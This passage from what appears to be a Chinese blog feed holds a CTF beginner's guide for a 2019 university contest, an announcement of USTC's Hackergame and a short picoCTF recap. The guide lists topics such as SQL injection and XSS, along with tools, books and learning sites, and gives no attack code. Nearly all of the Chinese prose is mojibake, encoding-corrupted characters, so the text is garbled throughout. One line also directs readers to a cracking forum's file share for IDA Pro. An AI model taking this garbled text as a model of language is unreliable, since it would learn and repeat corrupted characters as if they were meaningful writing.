·çš„åŒå­¦å¯ä»¥æ³¨å†Œä¸ªè´¦å·ç©ç©ï¼Œä¸æ‡‚çš„å¯ä»¥ç™¾åº¦æˆ–è€…ç¾¤ä¸Šé—®å–”ï¼</p><p>  <a href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn/</a><br>  2019 å¹´åº¦ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬å…­å±Šä¿¡æ¯å®‰å…¨ç«èµ›å³å°†å¼€å¹•ï¼Œç§‘å¤§ä¿¡æ¯å®‰å…¨å¤§èµ›è‡ª 2014 å¹´èµ·å·²ç»è¿ç»­ä¸¾åŠäº”å±Šï¼Œå¾€å±Šæ¯”èµ›å‡é¡ºåˆ©ä¸¾è¡Œï¼Œè§„æ¨¡ç››å¤§ï¼Œå½±å“ç”šå¹¿ã€‚</p><p>  èµ›åˆ¶ï¼šä¸ªäººçº¿ä¸Šæ¯”èµ›ï¼Œè§£é¢˜æ¨¡å¼ï¼Œçº¦ 25 é“é¢˜ç›®ï¼›<br>  æ¯”èµ›é¢˜ç›®åˆ†ä¸º 4 ç±»ï¼Œåˆ†ç±»å¦‚ä¸‹ï¼šç»¼åˆæŠ€èƒ½ï¼ˆgeneralï¼‰ã€ç¨‹åºé€†å‘ä¸æ¼æ´åˆ©ç”¨ï¼ˆbinaryï¼‰ã€å¯†ç å­¦ä¸æ•°å­¦ï¼ˆmathï¼‰ã€ç½‘ç«™å®‰å…¨ï¼ˆwebï¼‰</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> å…¥é—¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> å…¥é—¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½›å¤§2019çº¢å¸½æ¯å…¥é—¨æŒ‡å¯¼</title>
      <link href="2019/10/17/2019hmb_guide/"/>
      <url>2019/10/17/2019hmb_guide/</url>
      
        <content type="html"><![CDATA[<p><a href="#web">Webå…¥é—¨ä¼ é€é—¨</a><br><a href="#re">Re é€†å‘ å…¥é—¨ä¼ é€é—¨</a><br><a href="#pwn">PWN äºŒè¿›åˆ¶ å…¥é—¨ä¼ é€é—¨</a><br><a href="#crypto">Crypto å¯†ç å­¦ å…¥é—¨ä¼ é€é—¨</a><br><a href="#misc">Misc æ‚é¡¹ å…¥é—¨ä¼ é€é—¨</a></p><p><a href="#catch_flag">èŒæ–°å…¥é—¨åˆ·é¢˜ä¼ é€é—¨</a></p><h3 id="1-webçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"><a href="#1-webçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼" class="headerlink" title="1.webçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"></a><span id="web">1.webçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼</span></h3><p>é¦–å…ˆï¼Œå¤§ç•¥è¿‡ä¸€ä¸‹æœ€åŸºç¡€çš„è¯­è¨€è¯­æ³•HTMLï¼CSSã€JavaScriptã€PHPã€SQLçš„åŸºæœ¬çŸ¥è¯†ï¼ˆå¹³å‡ä¸€ä¸ªè¯­è¨€4å°æ—¶è¶³çŸ£ï¼‰ï¼Œè¦åšåˆ°çœ‹åˆ°è¿™äº›ä»£ç çš„æ—¶å€™ä¸ä¼šç•æƒ§ï¼Œèƒ½çœ‹æ‡‚å¤§éƒ¨åˆ†ï¼Œçœ‹åˆ°ä¸æ‡‚çš„èƒ½é€šè¿‡googleæˆ–è€…ç›¸å…³æ–‡æ¡£æŸ¥æ‡‚ã€‚ä¸»è¦å‚è€ƒï¼š<a href="http://www.w3school.com.cn/">http://www.w3school.com.cn/</a> ã€<a href="http://www.runoob.com/">http://www.runoob.com/</a> , è¿™é‡Œä¸è¦æ±‚å­¦å¾ˆæ·±ï¼Œå¾ˆæµ…å¾ˆæµ…å°±è¡Œï¼Œåé¢è¾¹å­¦è¾¹ç”¨æŒæ¡çš„ä¼šæ›´å¿«ã€‚</p><p>ç°åœ¨ï¼Œä½ åˆæ­¥äº†è§£äº†ä¸€äº›è¯­è¨€çŸ¥è¯†ï¼Œæ¥ä¸‹æ¥ä½ å°±éœ€è¦å¼€å§‹åœ¨å®è·µä¸­å­¦ä¹ ä¸å·©å›ºã€‚</p><p>å½“ç„¶å°±æ˜¯å®è·µäº†ã€‚è¿™é‡Œï¼Œæˆ‘å»ºè®®ä½ æ­å»ºä¸€ä¸ªä¸ªäººçš„åšå®¢ï¼Œåˆæ­¥äº†è§£è¿™äº›è¯­è¨€çš„åº”ç”¨ã€‚åœ¨æ­å»ºåšå®¢çš„è¿‡ç¨‹ä¸­ï¼Œä½ éœ€è¦å­¦ä¹ å¯¹åº”çš„linuxæ“ä½œã€Apache+PHP+Mysqlç¯å¢ƒçš„é…ç½®ã€åŸŸåè§£æã€æœåŠ¡å™¨ç«¯å£é…ç½®ç­‰ç­‰ã€‚å¦‚ä½•æ­å»ºåšå®¢ï¼Œè¯·è‡ªè¡Œgoogleæœç´¢ã€‚æ­¤å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç¼–å†™ä¸€äº›å¥½ç©çš„ç½‘é¡µæ¥å­¦ä¹ è¿™äº›çŸ¥è¯†ç‚¹ã€‚</p><p>å¦‚æœä½ èƒ½å®Œæˆå¦‚ä¸Šæ‰€è¯´çš„è¿™äº›ï¼Œå°¤å…¶æ˜¯ç¬¬ä¸‰ç‚¹ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ å…¥é—¨äº†ï¼Œå…¶å®è¿™äº›å‰æœŸä¼šé‡åˆ°å¾ˆå¤šè¯­è¨€æ–¹é¢éš¾å…ä¼šé‡åˆ°æŒ«æŠ˜ï¼Œä½†æ˜¯æ²¡å…³ç³»ï¼Œå¤šç™¾åº¦å¤šè°·æ­Œï¼Œå¤šç¾¤é‡Œæé—®ï¼Œæˆ‘ä»¬éƒ½ä¼šåŠæ—¶ç»™ä½ è§£ç­”ã€‚</p><ul><li><p>æ¥ä¸‹æ¥å¯ä»¥äº†è§£åŸºæœ¬çš„HTTPåè®®ç›¸å…³çŸ¥è¯†</p><ul><li><p>æŒæ¡HTTPè¯·æ±‚ï¼šGETã€POSTã€HEADï¼Œèƒ½åŸºæœ¬è¯»æ‡‚ä¸€ä¸ªHTTPæ•°æ®åŒ…ï¼Œäº†è§£GETã€POSTã€HEADçš„åŒºåˆ«</p></li><li><p>èƒ½çœ‹æ‡‚HTTPå“åº”åŒ… 404 403 200 500 302 301 â€¦</p></li><li><p>äº†è§£Cookieã€sessionã€tokenï¼ŒçŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä½œç”¨æ˜¯ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆéœ€è¦è¿™äº›ä¸œè¥¿</p></li><li><p>äº†è§£Refererã€X-Forwarded-Forç­‰ç­‰çš„ä½œç”¨</p></li></ul></li><li><p>å­¦æ¼æ´çŸ¥è¯†ç‚¹ä¹‹å‰ï¼Œå¦‚æœä½ äº†è§£äº†å¦‚ä¸Šæ‰€è¯´çš„ä¸€äº›ä¸œè¥¿ï¼Œé‚£ä¹ˆå°±å¯ä»¥å­¦ä¹ ä¸‹é¢çš„çŸ¥è¯†(è¿›é˜¶)å•¦ï¼Œå½“ç„¶èƒ½å­¦æ‡‚ä¸Šé¢çš„çŸ¥è¯†å¯èƒ½éœ€è¦å¤§æ¦‚3å‘¨å·¦å³çš„æ—¶é—´ï¼Œå¤šåšæŒï¼Œå¤šæé—®ã€‚</p><p>  sqlæ³¨å…¥</p><p>  XSSæ”»å‡»</p><p>  æ–‡ä»¶ä¸Šä¼ æ¼æ´</p><p>  æ–‡ä»¶åŒ…å«æ¼æ´</p><p>  å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>  ã€‚ã€‚ã€‚</p></li></ul><p>æ¨èä¸€äº›å­¦ä¹ ç«™ç‚¹<br><a href="https://ctf-wiki.github.io/ctf-wiki/&gt;">https://ctf-wiki.github.io/ctf-wiki/&gt;</a> <a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a> <a href="https://www.anquanke.com/">https://www.anquanke.com/</a> <a href="https://github.com/CHYbeta/Web-Security-Learning">https://github.com/CHYbeta/Web-Security-Learning</a></p><p>æ¨èä¸€äº›é¢˜åº“<br><a href="https://cgctf.nuptsast.com/login">https://cgctf.nuptsast.com/login</a> <a href="https://www.jarvisoj.com/login">https://www.jarvisoj.com/login</a></p><p>æ¨èä¸€äº›å¤§ç‰›çš„åšå®¢<br><a href="https://chybeta.github.io/">https://chybeta.github.io/</a> <a href="https://www.jianshu.com/u/bf30f18c872c">https://www.jianshu.com/u/bf30f18c872c</a> <a href="https://skysec.top/">https://skysec.top/</a> <a href="https://lorexxar.cn/">https://lorexxar.cn/</a> </p><p>æ¨èä¹¦ç±<br>ã€Šç™½å¸½å­è®²webå®‰å…¨ã€‹ ã€Šé»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸Â·Webå®æˆ˜ç¯‡ã€‹</p><h3 id="2-Reverseçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"><a href="#2-Reverseçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼" class="headerlink" title="2.Reverseçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"></a><span id="re">2.Reverseçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼</span></h3><p>é€†å‘å·¥ç¨‹ï¼ŒReverseï¼Œç¼©å†™ä¸€èˆ¬ä¸ºReã€‚æ—¨åœ¨ä¸çŸ¥æ™“æºç çš„æƒ…å†µä¸‹å¯¹ç¨‹åºè¿›è¡Œåˆ†æï¼Œè·å–å…¶æµç¨‹ï¼Œç»„ç»‡ï¼Œç»“æ„ç­‰ã€‚CTFä¸­ä¸€èˆ¬ä¸ºæ³¨å†Œæœºè¿™ç§å½¢å¼ã€‚</p><p>æœ€å¥½ä¼šCè¯­è¨€å’Œæ±‡ç¼–è¯­è¨€ï¼Œä¸å¿…ç³»ç»Ÿçš„å­¦ä¹ æ±‡ç¼–ï¼Œä¸Šæ¥å…ˆä¸€æ¡ä¸€æ¡æŸ¥æŒ‡ä»¤æ‰‹å†Œï¼Œç­‰ç†Ÿæ‚‰äº†å†ä»”ç»†å­¦ä¹ ã€‚ éœ€äº†è§£å¸¸è§åŠ å¯†ç®—æ³•çš„å®ç°ï¼Œè¦åšåˆ°å¿«é€Ÿè¯†åˆ«ï¼Œæ— éœ€äº†è§£æ”»å‡»è¿‡ç¨‹ã€‚</p><p>å¦‚ä½•å­¦ä¹ é€†å‘å‘¢ï¼Œå¯ä»¥çœ‹ä¸‹é¢è¿™åŸºæœ¬ä¹¦å­¦ä¹ åŸºç¡€çŸ¥è¯†ï¼ŒåŒæ—¶æ‰“æ¯”èµ›åˆ·é¢˜ï¼Œä»¥èµ›å¸¦ç»ƒã€‚</p><ul><li><p>æ¨èä¹¦ç±<br>  ã€Šæ±‡ç¼–è¯­è¨€ã€‹ï¼ˆç‹çˆ½ï¼‰ è¿™æœ¬æ¯”è¾ƒè€äº†ï¼Œè®²çš„8086æ±‡ç¼–ï¼Œä½†æ˜¯è®²çš„å¾ˆå¥½ã€‚</p><p>  ã€ŠåŠ å¯†ä¸è§£å¯†ã€‹ï¼ˆç¬¬å››ç‰ˆï¼‰ï¼ˆçœ‹é›ªè®ºå›ï¼‰ çœ‹é›ªå‡ºçš„ç»å…¸ä¹¦ç±ï¼Œåå«åŠ å¯†ä¸è§£å¯†å®é™…ä¸Šæ˜¯è®²é€†å‘ã€‚å„æ–¹å„é¢éƒ½æœ‰è®²åˆ°ï¼Œå¾ˆå…¨é¢ã€‚</p><p>  ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹ ä¸»è¦æ˜¯windowsé€†å‘ï¼Œä»¥ODä¸ºä¸»è¦å·¥å…·ã€‚è®²çš„å¾ˆå¥½ï¼Œé¢å‘é›¶åŸºç¡€ã€‚</p><p>  ä¸‹é¢çš„æˆ‘æ²¡çœ‹è¿‡ï¼Œä¸å¥½è¯„ä»·ã€‚ã€‚ã€‚ ã€ŠReverse Engineering for Beginnersã€‹(ç”µå­ä¹¦ï¼š<a href="https://beginners.re/)%EF%BC%88%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%BA%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E3%80%8B%EF%BC%89">https://beginners.re/)ï¼ˆä¸­æ–‡ç‰ˆä¸ºã€Šé€†å‘å·¥ç¨‹æƒå¨æŒ‡å—ã€‹ï¼‰</a> ã€ŠAndroidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æã€‹ ã€ŠAndroidè½¯ä»¶å®‰å…¨ä¸é€†å‘åˆ†æã€‹</p></li><li><p>å¸¸ç”¨å·¥å…·<br>  IDA Pro æå…¶å¼ºå¤§çš„åæ±‡ç¼–/åç¼–è¯‘/è°ƒè¯•å·¥å…·ï¼ŒäºŒè¿›åˆ¶é€‰æ‰‹å¿…é¡»ä¼šç”¨ï¼Œä¼˜ç§€çš„äºŒè¿›åˆ¶é€‰æ‰‹èƒ½æŠŠIDAè¿ç”¨åˆ°å‡ºç¥å…¥åŒ–çš„åœ°æ­¥ã€‚æœ‰å…³IDAçš„ä½¿ç”¨èƒ½è®²å¥½å¤šå¥½å¤šã€‚ å¾çˆ±ç ´è§£è®ºå›çˆ±ç›˜ä¸‹è½½ã€‚</p><p>  x64dbg Windowså¹³å°ä¼˜ç§€çš„å¼€æºåæ±‡ç¼–å™¨åŠè°ƒè¯•å™¨ï¼Œå¯ä»¥çœ‹ä½œOlly dbgçš„å‡çº§ç‰ˆï¼ŒåŸºæœ¬åŒ…å«ODçš„å…¨éƒ¨åŠŸèƒ½ï¼Œä¸”ä¸€ç›´åœ¨æ›´æ–° å®˜ç½‘ä¸‹è½½ã€‚</p><p>  gdb Linuxçš„è°ƒè¯•å™¨ï¼Œæ²¡æœ‰GUIã€‚pwné€‰æ‰‹å¿…é¡»æŒæ¡çš„æŠ€èƒ½ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨IDAçš„è¿œç¨‹è°ƒè¯•åŠŸèƒ½è°ƒè¯•linxç¨‹åºã€‚ ä¸€èˆ¬çš„Linuxè‡ªå¸¦ï¼Œæ²¡æœ‰çš„è¯aptå®‰è£…ã€‚</p><p>  Jeb apkåç¼–è¯‘å·¥å…·ï¼ŒåŠŸèƒ½å¼ºå¤§ã€‚</p><p>  jadx å¼€æºçš„apkåç¼–è¯‘å·¥å…·ï¼Œè½»é‡çº§</p><p>  å…¶ä»– dnSpyï¼Œxspyï¼ŒCFF explorerç­‰å„ç±»ä¸“ç”¨å·¥å…·ï¼Œéœ€è¦é åšé¢˜ä¸­ç§¯ç´¯ã€‚</p></li><li><p>è®ºå›ä¸ç«™ç‚¹<br>  æ±‡ç¼–è¯­è¨€æŒ‡ä»¤å­¦ä¹ ï¼š<a href="https://www.cnblogs.com/del/category/121079.html">https://www.cnblogs.com/del/category/121079.html</a> è¿™ä¸€ç³»åˆ—æ–‡ç« ç»†è‡´çš„è®²è§£äº†win32æ±‡ç¼–ï¼Œé‡åˆ°ä¸è®¤è¯†çš„æŒ‡ä»¤å¯åˆ°è¿™é‡ŒæŸ¥è¯¢ï¼ˆå½“ç„¶ç›´æ¥ç¿»intelæŒ‡ä»¤æ‰‹å†Œæ˜¯æœ€å‡†ç¡®çš„ï¼‰</p><p>  å¾çˆ±ç ´è§£ï¼šçŸ¥åç ´è§£è®ºå›ï¼Œæ³¨å†Œæœ‰é™åˆ¶ï¼Œéœ€è¦10å…ƒæ³¨å†Œæˆ–ç­‰å¼€æ”¾ã€‚å¾çˆ±çš„çˆ±ç›˜å†…æœ‰å¤§é‡å¸¸ç”¨å·¥å…·ï¼Œä»¥åŠé€†å‘ä¸“ç”¨è™šæ‹Ÿæœºï¼Œå¯æŒ‰éœ€å­¦ä¹ ä¸ä½¿ç”¨ã€‚ <a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a></p><p>  çœ‹é›ªè®ºå›ï¼šçŸ¥åé€†å‘è®ºå› <a href="https://bbs.pediy.com/">https://bbs.pediy.com/</a></p><p>  å®‰å…¨å®¢ã€å…ˆçŸ¥ç­‰å„ç±»å®‰å…¨è®ºå›ï¼Œä¸Šé¢æœ‰å„ç§å¤§ä½¬å‘çš„æ–‡ç« ã€‚</p></li></ul><h3 id="3-PWNçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"><a href="#3-PWNçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼" class="headerlink" title="3.PWNçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"></a>3.<span id="pwn">PWNçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼</span></h3><p>pwnï¼ŒåŠpwn to ownï¼Œåœ¨é»‘å®¢ä¿šè¯­ä¸­ç”±ownæ¼”å˜è€Œæ¥ã€‚é€šè¿‡é€†å‘åˆ†æäºŒè¿›åˆ¶ç¨‹åºï¼Œå‘ç°å…¶å¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼Œå¹¶è¿›è¡Œåˆ©ç”¨ï¼Œä»è€Œè¾¾åˆ°ä¿¡æ¯æ³„éœ²ã€æƒé™è·å–ç­‰ç›®çš„ã€‚</p><p>éœ€è¦æŒæ¡æ±‡ç¼–è¯­è¨€ã€åŸºç¡€é€†å‘æ–¹æ³•ã€‚ å…¥é—¨æ¨èåˆ°CTF wikiçš„pwnæ¿å—å­¦ä¹ ï¼Œä¸Šé¢æœ‰æå…¶è¯¦ç»†çš„pwnæ•™ç¨‹ï¼Œå„ç±»æ¼æ´ç‚¹åŠåˆ©ç”¨ã€‚</p><p>CTFä¸€èˆ¬ä¸ºlinuxç¯å¢ƒä¸‹çš„pwnï¼Œè¦ç†Ÿæ‚‰linuxçš„ä½¿ç”¨ã€‚ IDA Pro å¼ºå¤§çš„åç¼–è¯‘å·¥å…·ï¼Œæœ‰äº†å®ƒå°±èƒ½è½»æ¾å®¡è®¡æ¼æ´äº†ã€‚ gdbä¸ºåšpwné¢˜æ—¶è°ƒè¯•å¿…å¤‡çš„å·¥å…·ï¼Œç½‘ä¸Šæœ‰éå¸¸å¤šå…³äºgdbçš„æ•™ç¨‹ã€‚ pwndbgâ€”â€”gdbæ’ä»¶ï¼š<a href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a> pwntoolsä¸ºä¸“é—¨ç”¨æ¥åšpwné¢˜çš„å·¥å…·ï¼Œæ‰€ä»¥è¦å­¦ä¹ pythonä¸pwntoolsã€‚</p><p>å…¶ä½™å­¦ä¹ æ•™ç¨‹ï¼š ä¸€æ­¥ä¸€æ­¥å­¦ROPç³»åˆ—ï¼š<br><a href="http://wooyun.jozxing.cc/static/drops/tips-6597.html">http://wooyun.jozxing.cc/static/drops/tips-6597.html</a> <a href="http://wooyun.jozxing.cc/static/drops/papers-7551.html">http://wooyun.jozxing.cc/static/drops/papers-7551.html</a> <a href="http://wooyun.jozxing.cc/static/drops/binary-10638.html">http://wooyun.jozxing.cc/static/drops/binary-10638.html</a> <a href="http://wooyun.jozxing.cc/static/drops/papers-11390.html">http://wooyun.jozxing.cc/static/drops/papers-11390.html</a> å †åŸºç¡€å­¦ä¹ : glibcå†…å­˜ç®¡ç†ptmallocæºä»£ç åˆ†æ.pdf linuxå†…æ ¸æºç (å»ºè®®ç›´æ¥çœ‹malloc freeæºç ) å †åŸºç¡€(è‹±æ–‡blog) æ¨èä¹¦ç±ï¼š ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆåŸä¹¦ç¬¬3ç‰ˆï¼‰ã€‹ ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»â€”é“¾æ¥ã€è£…è½½ä¸åº“ã€‹</p><h3 id="4-Cryptoçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"><a href="#4-Cryptoçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼" class="headerlink" title="4.Cryptoçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"></a>4.<span id="crypto">Cryptoçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼</span></h3><p>å¯†ç å­¦éœ€è¦è¾ƒå¼ºçš„æ•°å­¦åŸºç¡€ã€‚ctf wikiä¹Ÿæ˜¯å…¥é—¨ä¸é”™çš„é€‰æ‹©ã€‚ äº†è§£å„ç§å¯†ç çš„å®ç°è¿‡ç¨‹ï¼Œç›¸å…³çš„æ”»å‡»æ–¹æ³•ã€‚ å„ç§å¯†ç æ¨èç›´æ¥åˆ°è‹±æ–‡ç»´åŸºå­¦ä¹ ï¼Œè®²çš„ååˆ†è¯¦ç»†ï¼Œä¸€èˆ¬ä¹Ÿä¼šæœ‰æºä»£ç ã€‚ ä¸Šæ¥å­¦ä¹ å¯†ç å­¦å¯ä»¥æŠ„è„šæœ¬ï¼Œä¸ç”¨å¤ªå…³å¿ƒå…¶æ•°å­¦åŸç†ã€‚ç­‰æ·±å…¥äº†è§£åå†è¯¦ç»†ç ”ç©¶ã€‚</p><p>å¤å…¸å¯†ç â€”â€”è„‘æ´å¤§å¼€çš„å¯†ç ï¼šé“¾æ¥ RSAæ”»å‡»æ±‡æ€»ï¼š<a href="https://xz.aliyun.com/t/2446#toc-32">https://xz.aliyun.com/t/2446#toc-32</a> RSAcoppersmithsæ”»å‡»ï¼š<a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p>ä¸€å †å¯†ç å­¦çš„é¢˜ç›®ï¼š<a href="https://cryptopals.com/">https://cryptopals.com/</a></p><p>æ¨èä¹¦ç±ï¼š ã€Šæ·±å…¥æµ…å‡ºå¯†ç å­¦â€”â€”å¸¸ç”¨åŠ å¯†æŠ€æœ¯åŸç†ä¸åº”ç”¨ã€‹ ã€Šå¯†ç ç¼–ç å­¦ä¸ç½‘ç»œå®‰å…¨â€”â€”åŸç†ä¸å®è·µï¼ˆç¬¬ä¸ƒç‰ˆã€‹ ã€Šå›¾è§£å¯†ç æŠ€æœ¯ã€‹ ã€Šåº”ç”¨å¯†ç å­¦ï¼šåè®®ã€ç®—æ³•ä¸Cæºç¨‹åºã€‹</p><h3 id="5-Miscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"><a href="#5-Miscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼" class="headerlink" title="5.Miscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼"></a>5.<span id="misc">Miscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼</span></h3><p>æ‚é¡¹ï¼Œç®€ç§°Miscã€‚æ‚é¡¹çš„å†…å®¹å¾ˆå¤šå¾ˆå¹¿ï¼Œéœ€è¦é€‰æ‰‹æœ‰è¾ƒå¤§çš„çŸ¥è¯†é¢ä»¥åŠå¿«é€Ÿå­¦ä¹ æ–°é²œäº‹ç‰©çš„èƒ½åŠ›ã€‚ ä¸€èˆ¬åŒ…æ‹¬å–è¯ï¼Œéšå†™åˆ†æï¼Œç¼–ç è½¬æ¢ï¼Œä¿¡æ¯æ”¶é›†ï¼Œæµé‡åˆ†æç­‰ã€‚æœ‰æ—¶å¯†ç å­¦ä¸­çš„å¤å…¸å¯†ç ä¹Ÿè¢«æ”¾åˆ°æ‚é¡¹é‡Œå»ã€‚å…¶ä¸­å–è¯ä¸éšå†™æ˜¯miscæœ€é‡è¦çš„ä¸€å—ã€‚éœ€è¦é€‰æ‰‹æŒæ¡å„ç§èŠ±å¼éšå†™å¥—è·¯ï¼Œéœ€æœ‰è¾ƒå¼ºçš„è„šæœ¬åŠŸåº•ï¼Œä¼šç”¨å„ç±»éšå†™å·¥å…·ã€‚</p><p>éšå†™ <a href="https://www.jianshu.com/p/02fdd5edd9fc">https://www.jianshu.com/p/02fdd5edd9fc</a><br>æµé‡åˆ†æ ã€ŠWiresharkç½‘ç»œåˆ†æå°±è¿™ä¹ˆç®€å•ã€‹<br>ctf-wiki: <a href="https://ctf-wiki.github.io/ctf-wiki/misc/introduction-zh/">https://ctf-wiki.github.io/ctf-wiki/misc/introduction-zh/</a></p><h3 id="é€‚åˆèŒæ–°åˆ·é¢˜å…¥é—¨ä¼ é€é—¨"><a href="#é€‚åˆèŒæ–°åˆ·é¢˜å…¥é—¨ä¼ é€é—¨" class="headerlink" title="é€‚åˆèŒæ–°åˆ·é¢˜å…¥é—¨ä¼ é€é—¨"></a><span id="catch_flag">é€‚åˆèŒæ–°åˆ·é¢˜å…¥é—¨ä¼ é€é—¨</span></h3><ul><li><p><a href="https://adworld.xctf.org.cn/">æ”»é˜²ä¸–ç•Œ æœ‰èŒæ–°åŒº</a></p></li><li><p><a href="https://hack.lug.ustc.edu.cn/">2019ä¸­ç§‘å¤§ctfæ–°ç”Ÿèµ›</a></p></li><li><p><a href="https://cgctf.nuptsast.com/">å—äº¬é‚®ç”µå¤§å­¦ç½‘ç»œæ”»é˜²å¹³å° è¾ƒå¤šä¸ºç®€å•é¢˜</a></p></li><li><p><a href="https://picoctf.com/">picoCTF2018å’Œ2019 ç¾å›½é¢å‘é«˜ä¸­ç”Ÿçš„ctfæ¯”èµ›</a></p></li><li><p><a href="https://github.com/ustclug/hackergame2018-writeups">2018ä¸­ç§‘å¤§ctfæ–°ç”Ÿèµ› githubå­˜æ¡£</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> å…¥é—¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> å…¥é—¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019picoå°æ±‡æ€»</title>
      <link href="2019/10/13/2019pico/"/>
      <url>2019/10/13/2019pico/</url>
      
        <content type="html"><![CDATA[<h4 id="å’Œä¸¤ä½æ–°è®¤è¯†çš„å°ä¼™ä¼´ä¸€èµ·ç©äº†1å¤©ï¼Œè™½ç„¶è§£å‡ºæ¥çš„é¢˜ä¸ç®—å¾ˆå¤šï¼Œä½†ç©çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒã€‚picoctfç›¸å¯¹æ¥è¯´ä¹Ÿä¼šç®€å•äº›ï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯æœ‰æ”¶è´§çš„ã€‚åœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚"><a href="#å’Œä¸¤ä½æ–°è®¤è¯†çš„å°ä¼™ä¼´ä¸€èµ·ç©äº†1å¤©ï¼Œè™½ç„¶è§£å‡ºæ¥çš„é¢˜ä¸ç®—å¾ˆå¤šï¼Œä½†ç©çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒã€‚picoctfç›¸å¯¹æ¥è¯´ä¹Ÿä¼šç®€å•äº›ï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯æœ‰æ”¶è´§çš„ã€‚åœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚" class="headerlink" title="å’Œä¸¤ä½æ–°è®¤è¯†çš„å°ä¼™ä¼´ä¸€èµ·ç©äº†1å¤©ï¼Œè™½ç„¶è§£å‡ºæ¥çš„é¢˜ä¸ç®—å¾ˆå¤šï¼Œä½†ç©çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒã€‚picoctfç›¸å¯¹æ¥è¯´ä¹Ÿä¼šç®€å•äº›ï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯æœ‰æ”¶è´§çš„ã€‚åœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚"></a>å’Œä¸¤ä½æ–°è®¤è¯†çš„å°ä¼™ä¼´ä¸€èµ·ç©äº†1å¤©ï¼Œè™½ç„¶è§£å‡ºæ¥çš„é¢˜ä¸ç®—å¾ˆå¤šï¼Œä½†ç©çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒã€‚picoctfç›¸å¯¹æ¥è¯´ä¹Ÿä¼šç®€å•äº›ï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯æœ‰æ”¶è´§çš„ã€‚åœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚</h4><p>ç”±äºå›½åº†æ¯”è¾ƒå¿™ï¼Œä¹Ÿæ²¡æœ‰ç»§ç»­åœ¨è§£é¢˜äº†ï¼Œç„¶åä¹Ÿå¿˜äº†å†™è®°å½•äº†ï¼Œemmmã€‚ä¸‹å›¾æ˜¯æˆ‘ä»¬é˜Ÿä¼çš„1å¤©çš„è§£é¢˜æˆæœã€‚è¿™æ˜¯æŠ¥äº†å°ä¼™ä¼´çš„å¤§è…¿@guoguo @å›å¿†<br><img src="/img/ctf/2019pico/1.png" class="lazyload" data-srcset="/img/ctf/2019pico/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>è¿‡äº›å¤©å†è¡¥ä¸Šå¿ƒå¾—ï¼Œ2333</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> æ¯”èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æ™ºèƒ½å…¥é—¨ä½œä¸š</title>
